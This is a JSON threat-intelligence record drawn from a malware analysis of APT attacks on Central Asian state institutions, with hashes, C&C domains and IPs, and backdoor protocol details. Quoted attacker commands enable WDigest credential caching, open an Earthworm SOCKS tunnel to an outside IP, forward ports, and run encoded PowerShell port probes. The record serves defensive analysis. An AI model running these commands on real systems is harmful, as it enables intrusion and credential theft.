{"rule_id": 195, "name": "Study_of_the_APT_attacks_on_state_institutions_in_Kazakhstan_and_Kyrgyzstan_en", "description": "-", "references": [], "File_Names": ["msvsct.txt", "services.exe", "Rapi.dll", "yyyyyyyyGoogle.sys", "EMLPRO.EXE", "WmiPrvServer.exe", "logos.txt", "avpui.exe", "xPath.dll", "CLNTCON.exe", "rdp.sh", "tunnel_host.port", "struct.pack", "teldcomtv.com", "NvSmart.hlp", "hal.dll", "mshelp.bat", "dnscache.dll", "xPath64.dll", "dllhost.exe", "header.errc", "config.dat", "gdiplus.dll", "ReplaceDll.dll", "windbg.exe", "SERVICES.EXE", "nwsapagent.dll", "scansts.dll", "WZ9Jan10.TMP", "nnncity.xyz", "SecKernel.pdb", "yyyyyyyygoogle.sys", "wmiexec.vbs", "msvsct.exe", "header.key", "themeui.dll", "srv.dll", "cmdl32.dat", "updates.php", "http_dll.dll", "WinInet.dll", "server.dll", "cryptsocket.exe", "PayloadDll.dll", "Exploit.RTF", "CMD_UDP_DLL.pdb", "oci.dll", "vmwared.exe", "halacpi.dll", "d.log", "CLNTCON.ocp", "packet.data", "Wininet.dll", "jsproxy.dll", "nwsapagenttt.dll", "msvsct.ini", "wmi.vbs", "installstat.tmp", "header.len", "halmacpi.dll", "winver.exe", "boot.cfg", "02d.dmp", "srv.type", "m17.exe", "ExplorerFrame.dll", "CLNCON.ocx", "RasTls.dll", "NDIS.SYS", "MISICS.dll", "EHSrv.exe", "doc.rtf", "alg.exe", "CLNTCON.ocx"], "MD5_Hashes": ["220B9FDC9C3CB7C667DCED54D92CFA0F"], "SHA1_Hashes": ["2930efc03e958479568e7930f269efb1e2bcea5a", "b07568ef80462faac7da92f4556d5b50591ca28d", "b03c98a9539d4cbb17f2efc118c4b57882b96d93", "34085c6d935c4df7ce7f80297b0c14a8d3b436d8", "314b259739f4660e89221fa2e8990139a84611a9", "a1c6958372cd229b8a75a09bdff8d72959bb6053", "8675e4c54a35b64e6fee3d8d7ad500f618e1aac9", "aa0e7101b1663c23f980598ca3d821d7b6ea342d", "c47883f01e51a371815fc86f2adbfb16ffb3cb8a", "5b041bce8559334dc9e819c72da9ff888d7e39c9", "c90ade97ec1c6937aedeced45fd643424889d298", "fc4844a6f9b5c76abc1ec50b93597c5cfde46075", "6fc2e76a0d79cc2a78a8d73f63d2fc433ede8bd5", "8d5e7d389191a3de73350d444c3989857077f629", "d4558761c52027bf52aa9829bbb44fe12920381d", "d52152661c836e76bebd46046ba3f877c5d381d8", "8cc16ad99b40ff76ae68d7b3284568521e6413d9", "e6381d09cdf15973f952430e70547d0b88bb1248", "7797107eb4a9a9e4359413c15999603fa27714b3", "b7eac081c814451791f0cd169d0c6a525a05194d", "f6bf976a2fdef5a5a44c60cbfb0c8fcbdc0bae02", "e4e365cc14eeeba5921d385b991e22dea48a1d75", "5c21ce425ff906920955e13a438f64f578635c8f", "e98f3b43ab262f4c4e148e659cc615a0612d755f", "23dbe50d3484ba906a2fd4b7944d62fb4da42f95", "5b8f28a5986612a41a34cb627864db80b8c4b097", "c4ef5981bee97c78d29fb245d84146a5db710782", "3e1d66ea09b7c4dbe3c6ffe58262713806564c17", "30debaf4ec160c00958470d9b295247c86595067", "ec548ba0ec9d2452c30e9ef839eb6582a4b685c8", "56000aa9a70ff3c546dab3c2a3b19021636b3b9c", "48944207135ffbf0a3edf158e5fe96888a52fada", "84c34167a696533cc7eddb5409739edd9af232ed", "cce4ba074aa690fc0e188c34f3afff402602921a", "a707de5a277573b8080e2147bd99ec1015cf56c5", "05a2b543b5a3a941c7ad9e6bff2a101dc2222cb2", "2e2919ce6f643d73ff588bccdc7da5d74c611b2c", "f5fe30ee6e2de828c7a6eecbb7f874dc35d31f43", "2c51147b271d691f0ab040f62c821246604d3d81", "b6fba9877ad79ce864d75b91677156a33a59399e", "2bf5cfe30265a99c13f5adad7dd17ccb9db272e0", "9a2d98321356ad58ea6c8a7796fd576e76237bd1", "1ba85de14f85389bf3194acea865f4c819d7b602", "e70a5ce00b3920d83810496eab6b0d028c5f746e", "7bcb10f1ed9b41abbbe468d177cd46991c224315"], "SHA256_Hashes": [], "Registry_Entries": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] 'AUTORUN' = ", "HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Version\n\nVector\\IE parameter or hardcoded 8.0;\n\n3. Windows NT X.Y, where X.Y is the Windows version;\n\n4. Parameter values from the\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\5.0\\User Agent\\Post Platform,\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\User Agent\\Post Platform keys, as well as similar values from the\nHKCU section, are combined via ;;\n\n5. Closing bracket ).\n\nThe specified parts are combined into a single string that serves as the User-Agent.\n\nThe resource string is formed as /index?id=%7.P, where the parameter is the address of\nthe local variable. The method is selected depending on the value of\nconfig.HTTP_method:\n\n\u00b7 0 \u2014 GET;\n\u00b7 1 \u2014 POST;\n\u00b7 2 \u2014 random choice between GET and POST.\n\nThen M-headers are added, which are necessary for the HTTP connection to work and sync\n(similar to the prefix structure in BackDoor.PlugX.28).\n\n\u00b7 M-Session:\n\u00b7 M-Status:\n\u00b7 M-Size:\n\u00b7 M-Sn:\n\n\f128\n\n128\n\nData is transmitted in the request body. Packets are encrypted using the same algorithm\nused for the encryption configuration. When preparing a packet for encryption, the\npacket.header.key field contains the 20161127h value, but later it is replaced with a\nrandom key. When encrypting and compressing both transmitted and received data, the\nfollowing options can be used:\n\n\u00b7 If in the packet_hdr.command_id field the bit is set to 0x10000000, a packet is not\n\ncompressed (for example, the closing packet after sending a file);\n\n\u00b7 If the bit is set to 0x20000000 in the same field, the packet is not encrypted.\n\nThe field of the len header specifies the length of the compressed and uncompressed data\n(2 low-order bytes for compressed length, 2 high-order bytes for uncompressed length).\n\nWhen using a TCP connection, data is transmitted without any headers.\n\nThe general commands are similar to those of BackDoor.PlugX.28:\n\nCommand\n\nFunction\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\nSending system information\n\nRe-requesting the command\n\nOperating with plug-ins\n\nConnection reset\n\nSelf-deleting\n\nSending current configuration to the C&C server\n\nReceiving new configuration.\n\nSending information about processes with injections (msiexec.exe) \n\nSending the results of LAN scanning\n\n10\n\n(see below)\n\nOperating with plug-ins (command 3) is performed in a separate OlProcManager thread\nand implemented the same way as in BackDoor.PlugX.28.\n\nWhen a new configuration is received, it is saved as <config.homedir>\\boot.cfg and\napplied immediately. After that, the trojan receives information about proxy servers from all\navailable sources:\n\n\f129\n\n129\n\n\u00b7 All proxy server parameters separated by :  \u2014 <type: port:address: ID:\n\npassword> are extracted from the HKLM\\Software\\CLASSES\\MPLS\\PROXY registry\nkey;\n\n\u00b7 Proxy system data is extracted from the\n\nHKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\nregistry key;\n\n\u00b7 The AutoConfigURL parameter retrieves the address used to call the\n\nUrlDownloadToFileA function. Then using InternetGetProxyInfo WinAPI from\njsproxy.dll the trojan makes a request to appengine[.]google.com, which results in\nobtaining proxy server data;\n\n\u00b7 Proxy data is extracted from the Mozilla configuration file: .default\\prefs.js.\n\nAll received data is saved in the internal object and used for connection. SOCKS4, SOCKS5,\nand HTTP proxy protocols can be used to establish a connection.\n\nAfter OlProcNotify, a new thread JoProc is initialized in the same OlProc, which then\ninitializes 3 threads sequentially:\n\nJoProcListen\nJoProcBroadcast\nJoProcBroadcastRecv\n\nJoProcListen starts the JoProcAccept thread, which creates a UDP connection object\nand also connects to the C&C server. It is assumed that this thread should have asynchronous\nforwarding between the UDP connection and the connection to the \u0421&C server but the\ncreated UDP connection object is non-working. When created, it does not connect to any\nhost, and the conditional methods that should transmit and receive data represent stubs that\nreturn the 0 value.\n\nThe same applies to the JoProcBroad\u0441ast and JoProcBroadcastRecv functions.\nJoProcBroad\u0441ast iterates through the available network adapters, retrieves their IP\naddresses, subnet masks, and gateway addresses, then creates a real TCP connection object\nand exits. JoProcBroadcastRecv also has no functionality. \n\nIt should be noted that the above operations are performed only if the\nconfig.broadcasting flag is set. The 9, 10 commands of the C&C server are also\ndesigned to work with network scanning, but there is no useful functionality in them. When\nthe 10 command is received, the config.broadcasting flag is checked and then the\ncommand execution stops. \n\n\f130\n\n130\n\nExecuting with 3 command line arguments\n\nSecond command line\nargument\n\nValue\n\nConditions for getting an\nargument\n\n100\n\n200\n\n201\n\n202\n\n209\n\nInstallation to the system\naccording to config.\npersist_mode, bypassing\nthe injection in processes\n\nInjection into the\nconfig.inject_target_\nproc process\n\n-\n\n-\n\nMain functionality\n\nPassed to the\nconfig.inject_target_\nproc process at startup and\ninjection\n\nMain functionality without\nachieving persistence\n\n-\n\nOperating with plug-ins\n\nTransmitted to msiexec.exe in\nthe case of\n\n\f131\n\n131\n\nconfig.flag_elevated_\ninject\n\n300\n\nSelf-deleting\n\n-\n\nWhen running with the 209 argument, argv[2] is also counted, which is the ID of the\ntrojan\u2019s parent process that launched msiexec.exe with injection. In this case, the \\\\.\n\\PIPE\\RUN_AS_USER(%d) pipe is created, where the format parameter is the PID of the\ncurrent process. Next, the DoImpUserProc thread is initialized, in which the trojan operates\nwith plug-ins. The trojan receives commands for plug-ins from the pipe, and the results are\nsent to the main process in the pipe.\n\nOperating with plug-ins\n\nExecution of plug-in tasks is generally identical to BackDoor.PlugX.28, with the exception of:\n\n\u00b7 The Netstat plug-in, which creates a table of TCP and UDP connections and manages the\n\nTCP connection, now counts OS versions with MajorVersion == 10;\n\n\u00b7 The Nethood plug-in only contains the A000h command, which collects information\nabout network resources. This backdoor modification does not include the A001h\ncommand, which allowed the disabling of a given network resource.\n\nNamed threads launching order\n\nbootProc  is the main function, and the rest of the threads are started from it:\n\n\u00b7 SiProc (injection to msiexec.exe),\n\u00b7 OlProc,\n\u00b7 OlProcNotify (connecting to the C&C server, working with commands),\n\u00b7 OlProcManager (processing tasks for plug-ins in the framework of the current process),\n\u00b7 JoProc (network scanning),\n\u00b7 JoProcListen (creating a tunnel between a conditional UDP connection and the C&C\n\nserver),\n\n\u00b7 JoProcBroadcast (network broadcasting),\n\u00b7 JoProcBroadcastRecv (processing responses to broadcasted messages),\n\u00b7 PlugProc (working with plug-ins during injection),\n\u00b7 LdrLoadShellcode,\n\u00b7 KLProc (keylogger thread),\n\u00b7 SxWorkProc (HTTP connection handler),\n\u00b7 DoImpUserProc (working with plug-ins via pipe).\n\n\f132\n\n132\n\nplug-in threads can be launched from OlProcManager and DoImpUserProc, depending\non the configuration:\n\n\u00b7 RtlMessageBoxProc (Runs while working with the Option plug-in, used to display\n\nMessageBox with the specified parameters);\n\n\u00b7 ScreenT1, ScreenT2 (Screen plug-in, threads for RDP emulation);\n\u00b7 ShellT1, ShellT2 (Shell plug-in, threads for reading and writing cmd pipe);\n\u00b7 TelnetT1, TelnetT1 (Telnet plug-in, threads for receiving and sending console\n\ndata).\n\n\f133\n\n133\n\nConclusion\n\nDuring the investigation, our specialists discovered several families of trojan programs used\nin these attacks. Samples and malicious activity analysis showed that the initial infection\noccurred long before the organization\u2019s employees detected the first signs of malware\npresence. Unfortunately, this scenario is one of the attributes of successful APT attacks, as\nmalware creators always allocate significant resources to concealing their presence within\nthe compromised system. \n\nThe study does not address the primary vector of infection, or the overall picture of infection\nof the entire infrastructure. We are convinced the trojans described in the study are only part\nof the malware involved in these attacks. The mechanisms hackers used make it very difficult\nto detect unauthorized presence and regain control of network objects. \n\nTo minimize risks, it is necessary to constantly monitor internal network resources, especially\nservers that are of high interest to the attackers such as domain controllers, mail servers, and\nInternet gateways. If the system is compromised, a prompt and appropriate analysis of the\nsituation is necessary to develop adequate counteraction measures. Doctor Web not only\ncreates anti-virus protection software, but also provides an investigation service for virus-\nrelated computer incidents, which include targeted attacks. If malicious activity within a\ncorporate network is suspected, the best option is to contact the Doctor Web virus\nlaboratory for qualified help. An early response will help minimize damage and prevent the\nworst consequences of targeted computer attacks.  \n\n\f134\n\n134\n\nAppendix. Indicators of Compromise\n\nSHA1 hashes\n\nExploit.RTF\n\na707de5a277573b8080e2147bd99ec1015cf56c5: doc.rtf\n\nBackDoor.Apper\n\n48944207135ffbf0a3edf158e5fe96888a52fada: dropper\n\n23dbe50d3484ba906a2fd4b7944d62fb4da42f95: RasTls.dll\n\n5b041bce8559334dc9e819c72da9ff888d7e39c9: shellcode\n\nBackDoor.CmdUdp\n\n314b259739f4660e89221fa2e8990139a84611a9: dnscache.dll\n\nBackDoor.Logtu\n\n7797107eb4a9a9e4359413c15999603fa27714b3: logsupport.dll\n\nBackDoor.Mikroceen\n\n2930efc03e958479568e7930f269efb1e2bcea5a: nwsapagent.dll\n\n56000aa9a70ff3c546dab3c2a3b19021636b3b9c: nwsapagenttt.dll\n\ne98f3b43ab262f4c4e148e659cc615a0612d755f: srv.dll\n\nBackDoor.PlugX\n\nb03c98a9539d4cbb17f2efc118c4b57882b96d93: CLNTCON.ocx\n\nb7eac081c814451791f0cd169d0c6a525a05194d: CLNTCON.ocx \n\n9a2d98321356ad58ea6c8a7796fd576e76237bd1: CLNTCON.ocx\n\nec548ba0ec9d2452c30e9ef839eb6582a4b685c8: CLNTCON.ocp\n\n7bcb10f1ed9b41abbbe468d177cd46991c224315: ESETSrv\n\n\f135\n\n135\n\nd52152661c836e76bebd46046ba3f877c5d381d8: http_dll.dll\n\n1ba85de14f85389bf3194acea865f4c819d7b602: QuickHeal\n\n8d5e7d389191a3de73350d444c3989857077f629: QuickHeal\n\naa0e7101b1663c23f980598ca3d821d7b6ea342d: scansts.dll\n\n84c34167a696533cc7eddb5409739edd9af232ed: msvsct.exe\n\n2c51147b271d691f0ab040f62c821246604d3d81: msvsct.ini\n\n2e2919ce6f643d73ff588bccdc7da5d74c611b2c: msvsct.ini\n\n6fc2e76a0d79cc2a78a8d73f63d2fc433ede8bd5: RasTls.dll\n\ne6381d09cdf15973f952430e70547d0b88bb1248: decrypted\n\nf6bf976a2fdef5a5a44c60cbfb0c8fcbdc0bae02: decrypted\n\nBackDoor.Whitebird\n\ne70a5ce00b3920d83810496eab6b0d028c5f746e: oci.dll\n\nc47883f01e51a371815fc86f2adbfb16ffb3cb8a: RasTls.dll\n\n6fc2e76a0d79cc2a78a8d73f63d2fc433ede8bd5: RasTls.dll\n\nBackDoor.Zhengxianma\n\ncce4ba074aa690fc0e188c34f3afff402602921a: RasTls.dll\n\nTrojan.Mirage\n\n34085c6d935c4df7ce7f80297b0c14a8d3b436d8: cmdl32.dat\n\nf5fe30ee6e2de828c7a6eecbb7f874dc35d31f43: config.dat\n\nc4ef5981bee97c78d29fb245d84146a5db710782: rapi.dll\n\nd4558761c52027bf52aa9829bbb44fe12920381d: server.dll\n\nTrojan.Misics\n\nc90ade97ec1c6937aedeced45fd643424889d298: MISICS.dll\n\n5b8f28a5986612a41a34cb627864db80b8c4b097: MISICS.dll.crt\n\n\f136\n\n136\n\nTrojan.XPath\n\n3e1d66ea09b7c4dbe3c6ffe58262713806564c17: svchost.exe\n\nb6fba9877ad79ce864d75b91677156a33a59399e: yyyyyyyygoogle.sys\n\n8cc16ad99b40ff76ae68d7b3284568521e6413d9: yyyyyyyygoogle.sys\n\n5c21ce425ff906920955e13a438f64f578635c8f: yyyyyyyygoogle.sys\n\ne4e365cc14eeeba5921d385b991e22dea48a1d75: PayloadDll.dll\n\nb07568ef80462faac7da92f4556d5b50591ca28d: PayloadDll.dll\n\nfc4844a6f9b5c76abc1ec50b93597c5cfde46075: xPath.dll\n\n2bf5cfe30265a99c13f5adad7dd17ccb9db272e0: xPath64.dll\n\nTool.Proxy\n\na1c6958372cd229b8a75a09bdff8d72959bb6053: cryptsocket.exe\n\n30debaf4ec160c00958470d9b295247c86595067: vmwared.exe\n\nTool.Scanner\n\n05a2b543b5a3a941c7ad9e6bff2a101dc2222cb2: m17.exe\n\nTool.WmiExec\n\n8675e4c54a35b64e6fee3d8d7ad500f618e1aac9: wmi.vbs\n\nDomains\n\ntv[.]teldcomtv[.]com\n\ndns03[.]cainformations[.]com\n\nwww[.]sultris[.]com\n\nkkkfaster[.]jumpingcrab[.]com\n\nwww[.]pneword[.]net\n\nv[.]nnncity[.]xyz\n\n\f137\n\n137\n\nnicodonald[.]accesscam[.]org\n\nIPs\n\n45.32.184[.]101\n\n45.63.114[.]127\n\n45.77.234[.]118\n\n45.251.241[.]26\n\n46.105.227[.]110\n\n46.166.129[.]241\n\n103.93.76[.]27\n\n104.194.215[.]199\n\n114.116.8[.]198\n\n116.206.94[.]68\n\n137.175.79[.]212\n\n142.252.249[.]25\n\n202.74.232[.]2\n\n\f", "HKLM\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0);\n\n\u00b7 If the process is running under WoW64;\n\u00b7 Domain information;\n\u00b7 If the current user has local administrative privileges;\n\u00b7 IP address;\n\u00b7 RAM amount in kilobytes;\n\u00b7 OS version;\n\u00b7 Current time;\n\u00b7 Screen resolution;\n\u00b7 Locale settings;\n\u00b7 Number of processors.\n\nThe response with the results is sent to the C&C server as a structure:\n\nstruct command_1_response\n{\n  packet_hdr header;\n  sysinfo data;\n};\n\nwhere sysinfo is a structure carrying system information:\n\nstruct sysinfo\n{\n\n\f95\n\n95\n\n  DWORD date_stamp; //20150202\n  DWORD zero_0;\n  DWORD self_IP;\n  DWORD total_PhysMem;\n  DWORD cpu_MHz;\n  DWORD screen_width;\n  DWORD screen_height;\n  DWORD winserv2003_build_num;\n  DWORD default_LCID;\n  DWORD tick_count;\n  DWORD systeminfo_processor_architecture;\n  DWORD systeminfo_number_of_processors;\n  DWORD systeminfo_processor_type;\n  DWORD zero_1;\n  DWORD os_MajorVersion;\n  DWORD os_MinorVersion;\n  DWORD os_BuildNumber;\n  DWORD os_PlatformId;\n  WORD os_ServicePackMajor;\n  WORD os_ServicePackMinor;\n  WORD os_SuiteMask;\n  WORD os_ProductType;\n  DWORD isWow64Process;\n  DWORD if_domain;\n  DWORD if_admin;\n  DWORD process_run_as_admin;\n  WORD systime_Year;\n  WORD systime_Month;\n  WORD systime_Day;\n  WORD systime_Hour;\n  WORD systime_Minute;\n  WORD systime_Second;\n  DWORD server_type;\n  WORD off_CCseed_file_data;  //offset from 0\n  WORD off_compname_string; \n  WORD off_username_string;\n  WORD off_verinfo_szCSDVersion;\n  WORD off_str_X_4_from_config;\n  BYTE string_CCseed_file_data[16];\n  .......\n  //strings\n};\n\noff_CCseed_file_data, off_compname_string, off_username_string,\noff_verinfo_szCSDVersion, off_str_X_4_from_config structure members are\noffsets relative to the beginning of the sysinfo structure. off_str_X_4_from_config is\noffset to the string copied from config.str_x_4 (x in the default configuration).\n\nThen trojan prepares a packet to send the information to the C&C server. The header\ncontains the packet ID that is equal to 1. Then the packet is compressed, encrypted, and sent\nto the server.\n\n\f96\n\n96\n\ncommand_id == 3 (operating with plug-ins)\n\nWhen a packet with command_id 3 is received, a task handler for plug-ins is launched in a\nseparate thread and a new connection to the C&C server is created. The incoming packet\nwith the command looks like this:\n\nstruct command_3_packet\n{\n  packet_hdr header;\n  DWORD dword_0;\n  DWORD index;\n};\n\nIf the value of index is equal to 0xFFFFFFFF, task processing for plug-ins is performed in\nthe same process. Otherwise, this value is used as an index in the array of the\ninjected_elevated_procs structure. The required structure is obtained from the array\nby the specified index. Then the process ID is extracted from it, which serves as a seed for\ngenerating the pipe name. The trojan creates the pipe connection object that implements\nthe command forwarding interface for plug-ins. These commands will be executed within\nanother process (for example, Internet Explorer), which will be injected in case of\n", "HKCU\\Software\\<config.service_name> registry key. If the parameter exists, it\ncompares its value with the system timestamp. If the timestamp\u2019s value is greater than the\nstored value, execution continues. Otherwise, the trojan goes standby mode for one second\n\n\fbefore rechecking. If the parameter\u2019s value does not exist, the calculated timestamp is\nplaced into this parameter and compared with the system timestamp. As a result, standby\nmode remains active until the system timestamp is larger than the timestamp calculated at\nthe beginning of the check, or larger than the timestamp stored in the parameter.\n\n91\n\n91\n\nresult_ts is placed in the registry if necessary.\n\nMultiplication of timestamp values is shown in the illustration:\n\nAfter timing checks, the malware creates a connection object that matches the type of\nconnection specified for the current server. If HTTP protocol is used to communicate with the\nC&C server, connection processing (receiving and transmitting data) is performed in a\nseparate thread. The first stage implies establishing a connection in a keep-alive mode and\nsending the first GET request. The URL is formed using the /%p%p%p format from three\nrandom DWORD values. Then the following structure is prepared:\n\nstruct prefix\n{\n  DWORD unknown;\n  DWORD sync_ctr;\n  DWORD conn_state;\n  DWORD available_buffer_size;\n};\n\nThis structure is only used when transmitting over HTTP protocol and performs the service\nfunction of syncing and maintaining the connection. When establishing a connection, the\nstructure fields are filled in with the following values from the connection object\u2019s internal\nfields:\n\n\f92\n\n92\n\n\u00b7 unknown = 0;\n\u00b7 sync_ctr = 1 \u2014 a counter that increases by one every sending;\n\u00b7 conn_state = 20130923 \u2014 represents the connection status flag. In this case, the initial\n\nvalue 20130923 is used by the client-side to make a connection request;\n\n\u00b7 available_buffer_size = 0xF010 \u2014 the initial size of the object's internal buffer for\n\nstoring incoming data.\n\nThis structure is encrypted with the same algorithm used for string encryption. The output\nstructure looks as follows:\n\nstruct http_encrypted_data\n{\n  DWORD key;\n  BYTE  data[0x10];\n}\n\nAfter encryption the data is encoded in Base64 and placed in the Cookie: header, then the\nrequest is sent to the C&C server.\n\nThe response contains the http_encrypted_data structure. Once decrypted, it transforms\ninto the prefix structure. The trojan checks the prefix.conn_state value that should be\nequal to 20130924. This value may indicate that the server is ready to receive data. Malware\nauthors also implied the 20130926 value that indicated the end of the connection. \n\nThen the prefix.sync_ctr field is checked. Its value must be greater by 1 than the\nprefix.sync_ctr value that is sent by the client-side. This form of interaction between\nserver and client-side is also used when sending real data. They are placed after the prefix\nstructure.\n\nAfter the connection to the server is established, a command request is prepared. To do so,\nthe trojan generates random bytes from 0 to 0x1F and forms the structure of the packet\nfrom the header and the body.\n\nstruct packet_hdr\n{\n  DWORD key;\n DWORD command_id;\n DWORD len;\n DWORD errc;\n};\nstruct packet\n{\n  packet_hdr header;\n  BYTE data[61440] //0xF000;\n};\n\nThis structure is used for sending data to the server and processing commands. The values of\nthe (\u201cpacket_hdr\u201d) header fields:\n\n\u00b7 key \u2014 a key used for data encryption;\n\n\f93\n\n93\n\n\u00b7 command_id \u2014 an ID for command or command response. The ID does not change\n\nduring the response;\n\n\u00b7 len \u2014 data length excluding header;\n\u00b7 errc \u2014 error code of command execution. In most cases this field contains the\n\n(GetLastError) error code if a command could not be fully executed, or contains 0 if a\ncommand is successfully executed. In some cases, it contains additional parameters for the\nclient-side to execute the command.\n\nDuring first sent, command_id and errc values are equal to 0, and the len value is equal\nto the length of the random sequence (0-0x1F). packet.data contains the random\nsequence itself. Then the data in the (", "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\Wdigest\n/v UseLogonCredential /t REG_DWORD /d 1 /f\nipconfig /displaydns\nc:\\windows\\debug\\windbg.exe -n 202.74.232.2 -o 53,80,443\nc:\\windows\\debug\\windbg.exe -n 202.74.232.2 -o 143,110\n\n\f7\n\n7\n\nreg query\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\Wdigest \n\nThe launched windbg.exe file was a TCP/UPD port scanner utility called PortQry.\n\nDuring our investigation, we found evidence indirectly confirming the connection of\ntargeted attacks on institutions of Central Asian republics. One of the uncovered samples\ncalled BackDoor.PlugX.38 used the nicodonald[.]accesscam[.]org domain, which was also\nused as the C&C server for BackDoor.Apper.14, also known as ICEFOG NG. A few years ago,\nwe discovered a backdoor of this family in a phishing email sent to one of the state\ninstitutions in Kazakhstan. Also, an RTF document that installs this sample of\nBackDoor.Apper.14 was first uploaded to VirusTotal from Kazakhstan on March 19, 2019.\n\nAn interesting finding within the framework of the Kyrgyzstan incident is the Logtu backdoor\nfound on an infected server along with the Mikroceen backdoor. In addition to a similar set\nof malware used by attackers in both incidents, Mikroceen points to a possible connection\nbetween the two attacks: a sample of this highly specialized backdoor was found on both\nnetworks and in both cases it was installed on the domain controller. \n\nDuring the search for samples related to these attacks, we found a specially made backdoor\nthat implements BIND Shell access to the command shell. The program\u2019s debugging\ninformation contains the project name in Chinese,  \ntrojan\u2019s origin.\n\n, which may indicate the\n\nIn addition to malicious programs, attackers used the following publicly available utilities\nfor lateral movement within the network:\n\n\u00b7 Mimikatz\n\u00b7 TCP Port Scanner V1.2 By WinEggDrop\n\u00b7 Nbtscan\n\u00b7 PsExec\n\u00b7 wmiexec.vbs\n\u00b7 goMS17-010\n\u00b7 ZXPortMap v1.0 By LZX\n\u00b7 Earthworm\n\u00b7 PortQry version 2.0 GOLD\n\nExamples of launching some of the listed utilities are shown below.\n\n\u00b7 ZXPortMap: vmwared.exe 21 46.105.227.110 53\n\n\u00b7 Earthworm: cryptsocket.exe -s rssocks -d 137.175.79.212 -e 53\n\n \n \n \n \n\f8\n\n8\n\nThe APT group also actively used its own PowerShell scripts to perform various tasks, such as\ncollecting information about an infected computer and other network devices, checking the\nC&C server status from an infected computer, etc. In addition, we found a PowerShell script\ndesigned for downloading all the contents from the Microsoft Exchange Server mailboxes of\nseveral of the organization\u2019s employees. \n\nExamples of certain PowerShell scripts executed on infected servers:\n\npowershell -enc\nDQAKADUAMwAsADMAOAA5ACAAfAAgACUAewBlAGMAaABvACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOA\nGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAApAC4AQwBvAG4AbgBlAGMAdAAoACIAdg\nAuAG4AbgBuAGMAaQB0AHkALgB4AHkAegAiACwAJABfACkAKQAgACIAUABvAHIAdAAgACQAaQAgAGkAcwAgAG8\nAcABlAG4AIQAiAH0AIAAyAD4AJABuAHUAbABsAA0ACgA=\n\npowershell -nop -enc\nDQAKADIAMQAsADIAMgAsADIANQAgAHwAIAAlAHsAZQBjAGgAbwAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0A\nCAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKQAuAEMAbwBuAG4AZQBjAHQAKA\nAiAHYALgBuAG4AbgBjAGkAdAB5AC4AeAB5AHoAIgAsACQAXwApACkAIAAiAFAAbwByAHQAIAAkAGkAIABpAHM\nAIABvAHAAZQBuACEAIgB9ACAAMgA+ACQAbgB1AGwAbAANAAoA\n\npowershell -enc\nIAA1ADMALAA1ADQALAA4ADAALAA0ADQAMwAgAHwAIAAlAHsAZQBjAGgAbwAgACgAKABuAGUAdwAtAG8AYgBqA\nGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKQAuAEMAbwBuAG4AZQ\nBjAHQAKAAiAHYALgBuAG4AbgBjAGkAdAB5AC4AeAB5AHoAIgAsACQAXwApACkAIAAiAFAAbwByAHQAIAAkAGk\nAIABpAHMAIABvAHAAZQBuACEAIgB9ACAAMgA+ACQAbgB1AGwAbAANAAoA\n\npowershell.exe -executionpolicy bypass -WindowStyle Hidden -File C:\\programdata\\x.ps1\n%COMSPEC% /Q /c tasklist /v >>c:\\programdata\\2.txt\n%COMSPEC% /Q /c systeminfo >>c:\\programdata\\2.txt\n%COMSPEC% /Q /c netstat -nvb    >> c:\\programdata\\2.txt\npowershell -exec bypass -command ", "HKLM\\\\SOFTWARE\\\n\\Microsoft\\\\LoginInfo] as its working registry branch. It creates keys in it and saves\nthe payload there:\n\n\u00b7 Video \u2014 configuration;\n\u00b7 DirectShow \u2014 XPath module;\n\u00b7 DirectDraw \u2014 PayloadDll module.\n\n\fThe modules are hardcoded in the trojan\u2019s body in a similar form to the driver (using APLib\nand XOR) and are present in two versions \u2014 for both 32-bit and 64-bit systems. Each\nmodule uses its own single-byte key. The modules are saved as a structure:\n\n10\n\n10\n\n#pragma pack(push,1)\nstruct mod\n{\n  _DWORD compressed_size;\n  _DWORD decompressed_size;\n  _BYTE data[compressed_size];\n};\n#pragma pack(pop)\n\nThe data module is decoded, but remains compressed. \n\nThe program then attempts to create a service with autorun and ImagePath to the extracted\ndriver. The driver file name is used as the service name.\n\nIf the service cannot be launched via SCManager and the service has already been created,\nan attempt is made to start the driver via ZwLoadDriver.\n\nTo check if the driver is working, the malware attempts to open the \\\\.\\BaiduHips\ndevice. In case of failure, a second attempt is made after 100 milliseconds. A total of 15\nattempts are made, after which the driver installation is considered incomplete. \n\nIf the driver is running, it sequentially starts the [%WINDIR%\\\\System32\\\\ping.exe],\n[%WINDIR%\\\\System32\\\\rundll32.exe %WINDIR%\\\\System32\\\\svchost.exe]\nand [%WINDIR%\\\\System32\\\\lsass.exe] processes.\n\nCOM Hijacking\n\nThe program saves its modules in the registry the same way as when installing the driver, but\nthis time using [HKCU\\\\SOFTWARE\\\\Microsoft\\\\LoginInfo] as the home branch.\n\nIt iterates through the registry keys in the HKU section and searches for a key with a name\ncontaining the S-1-5-21- substring and does not contain the _Classes substring. Inside\nthis key, it creates the Software\\\\Classes\\\\CLSID\\\\{ECD4FC4D-521C-11D0-B792-\n00A0C90312E1}\\\\ key for Windows 2000, Windows XP, Windows Server 2003, and the\nSoftware\\\\Classes\\\\CLSID\\\\{B12AE898-D056-4378-A844-6D393FE37956}\\\\\nkey for Windows Vista or later. For this key it sets the %TMP%\\\\Microsoft\\\n\\ReplaceDll.dll path as the parameter value (by default). It also creates the\nThreadingModel parameter with the Apartment value.\n\nAfter that, it unpacks the PayloadDll module into the %TMP%\\\\Microsoft\\\n\\ReplaceDll.dll directory.\n\n\f11\n\n11\n\nArtifacts\n\nThe Trojan.XPath.1 file contains 